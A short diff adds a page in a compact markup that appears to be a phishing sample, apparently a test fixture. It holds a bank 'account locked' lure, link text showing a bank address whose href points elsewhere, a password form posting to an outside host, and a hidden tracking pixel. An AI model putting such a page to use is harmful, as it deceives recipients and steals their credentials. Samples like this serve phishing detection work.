@@ -1,0 +1,2 @@
+head: 
+body: p{"Dear customer, your account has been " b{"locked"} ". "} p{"Verify it here: " a[href=https://example.com/x7]{"bank.example.org/verify"}} form[action=https://example.com/x7]{input[type=password name=pw] button{"Verify"}} img[src=https://example.com/pixel.gif style=display:none]
